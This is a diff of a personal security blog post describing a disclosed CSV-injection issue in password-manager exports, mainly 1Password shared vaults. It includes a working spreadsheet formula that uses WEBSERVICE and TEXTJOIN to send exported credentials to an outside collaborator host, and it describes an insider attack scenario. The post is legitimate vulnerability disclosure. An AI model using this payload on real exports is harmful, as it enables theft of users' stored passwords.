@@ -9,11 +9,10 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>Caleb Lerch | Placeholder.</title>
+    <title>Caleb Lerch | CSV Injection.</title>
     <meta name="author" content="Caleb Lerch" />
-    <meta name="description" content="A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design.
-" />
-    <meta name="keywords" content="jekyll, jekyll-theme, academic-website, portfolio-website" />
+    <meta name="description" content="My personal journey and portfolio into the world of information security and ethical hacking." />
+    <meta name="keywords" content="Caleb Lerch, hacking, security, cybersecurity, research, certification, analyst" />
 
 
     <!-- Bootstrap & MDB -->
@@ -101,8 +100,8 @@
 <div class="post">
 
   <header class="post-header">
-    <h1 class="post-title">Placeholder.</h1>
-    <p class="post-meta">May 6, 2025</p>
+    <h1 class="post-title">Weaponizing CSV Injection In Password Managers</h1>
+    <p class="post-meta">May 25, 2025</p>
     <p class="post-tags">
       <a href="/blog/2025"> <i class="fas fa-calendar fa-sm"></i> 2025 </a>
 
@@ -110,9 +109,166 @@
   </header>
 
   <article class="post-content">
-    <p>placeholder blog post</p>
 
-  </article>
+
+
+
+
+
+
+
+    <p> <b>Credit:</b> Thanks to Elysee Franchuk to teaching me what CSV injection is and helping me find this vulnerability.</p>
+
+    <p><br></p>
+    <h2>Summary</h2>
+
+    <p>CSV Injection occurs when a spreadsheet app such as Excel evaluates static content in CSV files as commands and executes code. An common example is formula elements, the field <code>=15+15</code> may populate as <code>30</code>. This is a benign example, but demonstrates the idea. Certain formula elements can cause an alteration of the data, web requests, and sometimes full code execution.</p>
+
+    <p>Most spreadsheet applications have been partially hardened against CSV injection. For example, Excel warns users if CSV files contain formulas, and block dangerous functions (such as DDE - Dynamic Data Exchange) by default.</p>
+
+    <p>Most password managers have a function to export the credentials in a CSV file. The purpose is to allow users to move credentials from one password manager to another. I tested 1Password, and Bitdefender password managers, as well as the built in password managers in Chrome, Firefox, and Internet Explorer. None sanitized against CSV injection. Discussion with 1Password about this determined that they do not sanitize the files because of data integrity issues if credentials are altered. </p>
+
+    <p>This means that CSV injection is theoretically possible in password managers. The challenges are: </p>
+    <ul>
+      <li>Creating a payload that is useful to the attacker, since getting remote code execution from Excel in modern systems requires gross misconfiguration.</li>
+      <li>Injecting the payload into someone else’s password manager, otherwise this is self-exploitation.</li>
+    </ul>
+
+    <p><br></p>
+    <h2>Creating the Payload</h2>
+
+    <p>The CSV export file creates a table with sites, usernames, passwords, and sometimes additional fields such as notes. An example table with test data taken from our exploit is shown below. </p>
+
+    <table class="table table-bordered">
+      <thead>
+        <tr>
+          <th scope="col">Site</th>
+          <th scope="col">Username</th>
+          <th scope="col">Password</th>
+          <th scope="col">Notes</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td></td>
+          <td>stomper4</td>
+          <td>GZMLqPAscAnrMT8DbM</td>
+          <td></td>
+        </tr>
+        <tr>
+          <td>https.//my.1password.com</td>
+          <td>stomper4@wearehackerone.com</td>
+          <td>testtest123</td>
+          <td></td>
+        </tr>
+        <tr>
+          <td></td>
+          <td>user2</td>
+          <td>veryuniquecode</td>
+          <td></td>
+        </tr>
+        <tr>
+          <td></td>
+          <td></td>
+          <td></td>
+          <td>PAYLOAD</td>
+        </tr>
+        </tbody>
+    </table>
+
+    <p>We were able to exfiltrate the table to a Burpsuite Collaborator server using the Excel TEXTJOIN function to append all of the credentials into a string, and the WEBSERVICE function to make a web request and pass the credentials in the URL We passed it to a Burp Collaborator server, this is a tool that allows us to recieve the requests.</p>
+
+    <p>An example of the payload is shown below. The URL is an old BurpSuite collaborator server:
+    <code>=WEBSERVICE("http://co44j8hwdssqvr7oxa973o9bt2zwnmbb.oastify.com?" & TEXTJOIN("&", FALSE, B1:B20))</code> <br>This payload creates an HTTP GET request with the arguments <code>?Column&Value1&Value2&Value3</code> etc.</p>
+          
+    <p>Images of Burp Collaborator recieving the credentials:</p>
+    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-01.png">
+    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-02.png">
+    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-03.png">
+
+    <p><br>The sites, usernames, and passwords were exfiltrated in 3 different requests which can be recreated to make a table as shown above.</p>
+    
+    <p><br></p>
+    <h2>Injecting the Payload</h2>
+    
+    <p>1Password enterprise accounts have secret and shared vaults. The secret vault is unique per user and holds all user credentials. The shared vault is given to multiple users and holds any credentials used by more than one person. </p>
+
+    <p>Anyone with write access to a shared vault can inject the malicious CSV payloads into the shared vault. The entire shared vault gets exported along with the private vault every time a user exports their passwords. When the payload is triggered after an export, all the shared and private credentials are sent to the hacker.</p>
+
+    <p>The threat profile for this vulnerability is a malicious insider. Someone from HR or IT instructs an employee from finance to perform a test backup of their password manager, and then steals the user's credentials to banks and/or financial services.</p>
+    
+    <p>The following image shows the payload being added to a shared vault by the malicious insider:</p>
+    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-05.png">
+
+    <p><br>The following image shows the payload recieved in the victims account, along with other shared credentials:</p>
+    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-06.png">
+
+    <p><br>The following images show the process for the victim to export their private vault:</p>
+    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-07.png">
+    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-04.png">
+    
+    <p><br>The results of the exfiltration was shown above in the images of Burp Collaborator, it included the private passwords for the user. This was a successful proof of concept for the exploit!</p>
+
+
+    <p><br></p>
+    <h2>Disclosure</h2>
+
+    <p>We disclosed this issue to 1Passwords bug bounty program on HackerOne. They recognized the vulnerability as within scope of their program, although closed it as informational since they have no intention of fixing it. They also updated their bug bounty program to mention CSV injection vulnerabilities as out of scope.</p>
+
+    <p>1Password was open to a longer discussion about the vulnerability and their reasoning behind not fixing it. They were primarily concerned with data integrity issues regarding modification of credentials before export.</p>
+
+    <p>We discussed this vulnerability from 2 perspectives, the first that all output to CSV should be sanitized, the second that some kind of warning or prevention should be in place upon entering payloads into the shared vault.</p>
+
+    <p>1Password did not agree to remediate the issue in either one of those ways. To be honest, I understand where they are coming from, this is a low likelihood exploit, that arises when one of their customers takes actions that they really shouldn't take. If the passwords aren't in the vault, is it still the password managers responsibility anymore? That said, a security researcher hopes for more than an update to the scope of the bug bounty program after a vulnerability submission. </p>
+
+    <p>Even though I didn't get a bounty this time, I was grateful to 1Password for the engagement and leaving a public review on my HackerOne Profile.</p>
+
+    <img class="img-fluid z-dept-1 rounded" src="/assets/img/CSV1-08.png">
+
+    <p><br></p>
+    <h2>Lesson</h2>
+
+    <p>The biggest question this experience brought up for me is whether or not it is the security industry's responsibility to tell users not to perform dangerous actions? In this case, CSV injection is deemed not a vulnerability because users should not open the CSV file with a spreadsheet app. </p>
+
+    <p>In my opinion, when safe operation depends on the user, we need to let them know. This is my reason for writing this post, as well as some of the inspiration for my personal site.</p>
+
+    <p>Stay tuned for more security findings.</p>
+
+    <p><br></p>
+    <h2>Links</h2>
+    <p>Read more about CSV Injection:</p>
+    <ul>
+      <li><a href="https://www.owasp.org/index.php/CSV_Injection" target="_blank" rel="noopener noreferrer">OWASP CSV Injection</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/1236.html" target="_blank" rel="noopener noreferrer">CWE-1236: Improper Neutralization of Formula Elements in a CSV File</a></li>
+    </ul>
+    <p>1Password's statement about the vulnerability:</p>
+    <ul>
+      <li><a href="https://hackerone.com/reports/3042984#activity-33527673" target="_blank" rel="noopener noreferrer">HackerOne Vulnerability Submission</a></li>
+      
+    </ul>
+    <p><br></p>
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+
+
 
 </div>
 
